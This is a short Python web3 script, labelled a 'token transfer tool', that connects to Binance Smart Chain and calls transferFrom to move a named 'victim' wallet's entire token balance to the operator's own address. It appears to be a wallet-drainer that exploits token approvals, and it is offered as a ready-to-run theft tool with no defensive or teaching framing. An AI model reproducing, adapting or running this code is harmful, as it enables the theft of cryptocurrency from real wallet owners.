from web3 import Web3
import argparse
import getpass

def main():
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Token transfer tool')
    parser.add_argument('--rpc', default="https://bsc-dataseed.binance.org/", help='BSC RPC endpoint')
    parser.add_argument('--token', required=True, help='Token contract address')
    parser.add_argument('--victim', required=True, help='Victim wallet address')
    parser.add_argument('--receiver', required=True, help='Your wallet address')
    args = parser.parse_args()

    # Securely get private key
    private_key = getpass.getpass("Enter your private key (hidden input): ")

    # Initialize Web3
    w3 = Web3(Web3.HTTPProvider(args.rpc))
    account = w3.eth.account.from_key(private_key)

    # Verify connection
    if not w3.is_connected():
        print("Failed to connect to blockchain")
        return

    # Contract ABI
    token_abi = [
        {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
        {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
    ]

    token = w3.eth.contract(address=args.token, abi=token_abi)

    try:
        # Check balances
        victim_balance = token.functions.balanceOf(args.victim).call()
        bnb_balance = w3.eth.get_balance(args.receiver)
        gas_needed = 200000 * w3.eth.gas_price

        print(f"\nVictim Token Balance: {victim_balance / 10**18}")
        print(f"Your BNB Balance: {w3.from_wei(bnb_balance, 'ether')}")
        print(f"Estimated Gas Cost: {w3.from_wei(gas_needed, 'ether')} BNB")

        if bnb_balance < gas_needed:
            print("\nError: Insufficient BNB for gas")
            return

        if victim_balance == 0:
            print("\nError: Victim has no balance")
            return

        # Build transaction
        tx = token.functions.transferFrom(
            args.victim,
            args.receiver,
            victim_balance
        ).build_transaction({
            'from': args.receiver,
            'gas': 200000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(args.receiver)
        })

        # Confirm before sending
        confirm = input("\nConfirm transfer (Y/N)? ").strip().upper()
        if confirm != 'Y':
            print("Transfer cancelled")
            return

        # Send transaction
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        print(f"\nSuccess! TX Hash: {tx_hash.hex()}")

    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
